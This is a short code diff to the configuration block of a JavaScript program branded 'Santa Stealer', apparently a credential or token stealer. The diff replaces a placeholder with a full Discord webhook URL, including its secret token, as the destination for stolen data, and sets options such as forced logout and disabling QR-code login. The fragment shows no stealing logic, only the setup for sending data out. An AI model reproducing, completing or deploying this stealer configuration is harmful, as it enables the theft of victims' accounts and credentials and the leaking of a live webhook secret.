@@ -10,7 +10,7 @@ const fs = require("fs");
 var config = {
     brand: "Santa Stealer",
 
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "https://canary.discord.com/api/webhooks/1245135037343731733/2_CdYr5Fuqt2LKcIUTa5of_L33o6WCh8Kk5DhjDiltQmHAVTdtdaxAjIxYW6hFOldj8z",
 
     logout: true,
     disable_qr_code: true,
